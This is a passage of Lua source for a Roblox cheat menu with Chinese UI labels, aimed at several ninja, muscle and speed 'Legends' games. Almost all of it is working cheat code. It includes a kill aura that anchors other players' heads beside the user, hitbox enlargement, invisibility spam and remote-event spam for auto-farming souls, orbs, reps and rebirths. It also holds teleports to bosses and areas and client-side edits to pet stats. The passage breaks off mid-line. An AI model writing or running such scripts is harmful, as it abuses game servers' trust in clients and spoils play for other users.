acc.Parent.BackgroundColor3=Color3.fromRGB(255,87,205)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,80,83)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,138,84)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,235,83)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(16,128,64)wait(0.1)
acc.Parent.BackgroundColor3=Color3.fromRGB(255,235,83)end end;coroutine.wrap(_db)()
local function adb()
local acc=Instance.new('LocalScript',cda)function onButtonClicked()
game.Players.LocalPlayer.Character.Humanoid.Health=0 end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(adb)()
local function bdb()
local acc=Instance.new('LocalScript',dda)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Bad"local adc=""local bdc=""
_G.Enabled=true
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bdb)()
local function cdb()
local acc=Instance.new('LocalScript',__b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Bad"local adc=""local bdc=""
_G.Enabled=false
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cdb)()
local function ddb()
local acc=Instance.new('LocalScript',a_b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Good"local adc=""local bdc=""
_G.Enabled=true
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(ddb)()
local function __c()
local acc=Instance.new('LocalScript',b_b)
function onButtonClicked()local bcc=game:GetService("VirtualUser")
local ccc=game.Players:GetPlayers()local dcc=game.Players.LocalPlayer;local _dc="Good"local adc=""local bdc=""
_G.Enabled=false
local function cdc()
for ddc,__d in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do if
__d.ClassName=="Tool"and __d:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(__d)end end end
while _G.Enabled and wait(2)do
if
workspace[dcc.Name]:FindFirstChild("Head")then if
workspace[dcc.Name].Head:FindFirstChild("nameGui")then
workspace[dcc.Name].Head.nameGui:Destroy()end end;dcc.ninjaEvent:FireServer("goInvisible")if
dcc.Character:FindFirstChild("inSafezone")then
dcc.Character.HumanoidRootPart.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,200,0)end
if
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")then
game.Players.PlayerRemoving:Connect(function(ddc)adc=(ddc.Name)
ccc=game.Players:GetPlayers()end)
game.Players.PlayerAdded:Connect(function(ddc)bdc=(ddc.Name)
ccc=game.Players:GetPlayers()end)ccc=game.Players:GetPlayers()
game:service'RunService'.Stepped:Connect(function()
if

dcc.Character and dcc.Character:FindFirstChildOfClass("Humanoid")then dcc.Character.Humanoid:ChangeState(11)end end)
for ddc,__d in pairs(ccc)do
if


__d.Name~=dcc.Name and __d.Name~=adc and __d.Name~=bdc and workspace:FindFirstChild(__d.Name)and workspace[__d.Name]:FindFirstChild("Head")then
if __d.Name~=game.Players.LocalPlayer.Name and not
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CanCollide=false;__d.Character.Head.Anchored=true
__d.Character.Head.Position=
dcc.Character.HumanoidRootPart.Position+Vector3.new(4.5,0,0)elseif __d.Name~=game.Players.LocalPlayer.Name and
__d.Character:FindFirstChild("inSafezone")then
__d.Character.Head.CFrame=
dcc.Character.HumanoidRootPart.CFrame+Vector3.new(0,20,0)end end end;if dcc.Character:FindFirstChildOfClass("Tool")then
dcc.Character:FindFirstChildOfClass("Tool"):Activate()end
for ddc,__d in
pairs(game.Workspace.soulPartsFolder:GetChildren())do
if
__d.Name=="soulPart"and __d.collectPlayers:FindFirstChild(dcc.Name)then
if
not __d:FindFirstChild("isGoodKarma")and _dc=="Bad"then
dcc.Character.HumanoidRootPart.CFrame=__d.CFrame+Vector3.new(0,5,0)dcc.ninjaEvent:FireServer("collectSoul",__d)elseif
__d:FindFirstChild("isGoodKarma")and _dc=="Good"then dcc.Character.HumanoidRootPart.CFrame=
__d.CFrame+Vector3.new(0,5,0)
dcc.ninjaEvent:FireServer("collectSoul",__d)end end end;cdc()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(__c)()
local function a_c()
local acc=Instance.new('LocalScript',c_b)
function onButtonClicked()while true do wait(.001)
game.Players.LocalPlayer.multiJumpCount.Value="50"end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(a_c)()
local function b_c()
local acc=Instance.new('LocalScript',d_b)function onButtonClicked()
while true do wait(.0001)local bcc="goInvisible"
local ccc=game.Players.LocalPlayer.ninjaEvent;ccc:FireServer(bcc)end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(b_c)()
local function c_c()
local acc=Instance.new('LocalScript',_ab)
function onButtonClicked()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Enchanted Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Astral Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Mystical Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Space Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Tundra Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Eternal Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Sandstorm Island"].CFrame;wait(.7)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game:GetService("Workspace").islandUnlockParts["Thunderstorm Island"].CFrame end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(c_c)()
local function d_c()
local acc=Instance.new('LocalScript',aab)
function onButtonClicked()
game:GetService("Players").LocalPlayer.PlayerGui.statEffectsGui.Enabled=
not
game:GetService("Players").LocalPlayer.PlayerGui.statEffectsGui.Enabled
game:GetService("Players").LocalPlayer.PlayerGui.hoopGui.Enabled=
not
game:GetService("Players").LocalPlayer.PlayerGui.hoopGui.Enabled end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(d_c)()
local function _ac()
local acc=Instance.new('LocalScript',bab)
function onButtonClicked()
while wait(1)do
for bcc,ccc in
pairs(game:GetService("Players"):GetPlayers())do
if
ccc.Name~=game:GetService("Players").LocalPlayer.Name then ccc.Character.Head.CanCollide=false
ccc.Character.Head.Size=Vector3.new(5,5,5)ccc.Character.Head.Transparency=0 end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_ac)()
local function aac()
local acc=Instance.new('LocalScript',cab)
function onButtonClicked()
while wait(.0001)do
if
game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")then
game.Players.LocalPlayer.ninjaEvent:FireServer("swingKatana")else
for bcc,ccc in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackShurikenScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(ccc)wait(.0001)if ccc.ClassName=="Tool"and
ccc:FindFirstChild("attackKatanaScript")then
game.Players.LocalPlayer.Character.Humanoid:EquipTool(ccc)end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(aac)()
local function bac()
local acc=Instance.new('LocalScript',dab)
function onButtonClicked()
while wait(0.01)do
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame;wait(.05)
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Workspace.Part.CFrame end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bac)()
local function cac()
local acc=Instance.new('LocalScript',_bb)
function onButtonClicked()
while wait(.001)do
if
player.PlayerGui.gameGui.maxNinjitsuMenu.Visible==true then
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame;wait(.05)
game.workspace.sellAreaCircles.sellAreaCircle.circleInner.CFrame=game.Workspace.Part.CFrame end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cac)()
local function dac()
local acc=Instance.new('LocalScript',abb)
function onButtonClicked()for bcc,ccc in
pairs(game.Players.LocalPlayer.Backpack:GetChildren())do
if ccc:FindFirstChild("attackTime")then ccc.attackTime.Value=0 end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(dac)()
local function _bc()
local acc=Instance.new('LocalScript',bbb)
function onButtonClicked()
while wait(.001)do
if
game:GetService("Workspace").bossFolder:WaitForChild("RobotBoss"):WaitForChild("HumanoidRootPart")then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Workspace.bossFolder.RobotBoss.HumanoidRootPart.CFrame
if player.Character:FindFirstChildOfClass("Tool")then
player.Character:FindFirstChildOfClass("Tool"):Activate()else
for bcc,ccc in pairs(player.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackKatanaScript")then
ccc.attackTime.Value=0.2
player.Character.Humanoid:EquipTool(ccc)
if attackfar then
for dcc,_dc in pairs(player.Backpack:GetChildren())do if

_dc.ClassName=="Tool"and _dc:FindFirstChild("attackShurikenScript")then
player.Character.Humanoid:EquipTool(_dc)end end end end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_bc)()
local function abc()
local acc=Instance.new('LocalScript',cbb)
function onButtonClicked()
while wait(.001)do
if
game:GetService("Workspace").bossFolder:WaitForChild("EternalBoss"):WaitForChild("HumanoidRootPart")then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=game.Workspace.bossFolder.EternalBoss.HumanoidRootPart.CFrame
if player.Character:FindFirstChildOfClass("Tool")then
player.Character:FindFirstChildOfClass("Tool"):Activate()else
for bcc,ccc in pairs(player.Backpack:GetChildren())do
if
ccc.ClassName=="Tool"and ccc:FindFirstChild("attackKatanaScript")then
ccc.attackTime.Value=0.2
player.Character.Humanoid:EquipTool(ccc)
if attackfar then
for dcc,_dc in pairs(player.Backpack:GetChildren())do if

_dc.ClassName=="Tool"and _dc:FindFirstChild("attackShurikenScript")then
player.Character.Humanoid:EquipTool(_dc)end end end end end end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(abc)()
local function bbc()
local acc=Instance.new('LocalScript',dbb)
function onButtonClicked()_G.Hoops=true
while _G.Hoops do
local bcc=workspace.Hoops:getChildren()
for i=1,#bcc do
if _G.Hoops then for i=1,10 do
bcc[i].touchPart.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;wait()end end;wait()end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(bbc)()
local function cbc()
local acc=Instance.new('LocalScript',_cb)
function onButtonClicked()
while wait(.0001)do
for bcc,ccc in
pairs(workspace.Hoops:GetDescendants())do if ccc:IsA("TouchTransmitter")then
ccc.Parent.CFrame=game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame end end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(cbc)()
local function dbc()
local acc=Instance.new('LocalScript',acb)function onButtonClicked()
game.Players.LocalPlayer.maxPetCapacity.Value=9999 end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(dbc)()
local function _cc()
local acc=Instance.new('LocalScript',bcb)
function onButtonClicked()
local bcc=game.Players.LocalPlayer.petsFolder:GetDescendants()for ccc,dcc in pairs(bcc)do
if dcc.ClassName=="NumberValue"then local _dc=dcc;_dc.Value=999999 end end end
acc.Parent.MouseButton1Click:connect(onButtonClicked)end;coroutine.wrap(_cc)()
end)
local creds = window:Tab("力量传奇",'6035145364')

local tool = creds:section("功能",true)
tool:Button("（自动锻炼提前选择锻炼方式重置人物及关闭）",function()
        	 local part = Instance.new('Part', workspace)
part.Size = Vector3.new(500, 20, 530.1)
part.Position = Vector3.new(0, 1000, 133.15)
part.CanCollide = true
part.Anchored = true

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 15, 0)

local a = true
local rs = game:GetService("RunService").RenderStepped
if a == true then
while rs:wait() do
for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
if v.ClassName == "Tool" and v.Name == "Weight" then
v.Parent = game.Players.LocalPlayer.Character
end
end
game:GetService("Players").LocalPlayer.muscleEvent:FireServer("rep")
end
end

end)
local tool = creds:section("功能（传送）",true)
tool:Button("（出生点）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(7, 3, 108)
end)
tool:Button("（蓝色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2543, 13, -410)
end)
tool:Button("（紫色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2177, 13, 1070)
end)
tool:Button("（橙色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-6686, 13, -1284)
end)
tool:Button("（白色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(4676, 997, -3915)
end)
tool:Button("（绿色健身房）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-8554, 22, -5642)
end)
local creds = window:Tab("极速传奇",'6035145364')

local tool = creds:section("功能（传送）",true)
tool:Button("（城市）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9682.98828125, 58.87917709350586, 3099.033935546875)
end)
tool:Button("（白雪城）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9676.138671875, 58.87917709350586, 3782.69384765625)
end)
tool:Button("（熔岩城）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11054.96875, 216.83917236328125, 4898.62841796875) 
end)
tool:Button("（传奇公路）",function()
        	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-13098.87109375, 216.83917236328125, 5907.6279296875)
end)
local tool = creds:section("功能（传送）",true)
tool:Button("（卡宠）",function()
        	spawn(function() while wait() do game:GetService("ReplicatedStorage").rEvents.rebirthEvent:FireServer("rebirthRequest") end end) while wait(0.1) do local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 = "Yellow Orb" local A_3 = "City" local Event = game:GetService("ReplicatedStorage").rEvents.orbEvent Event:FireServer(A_1, A_2, A_3) local A_1 = "collectOrb" local A_2 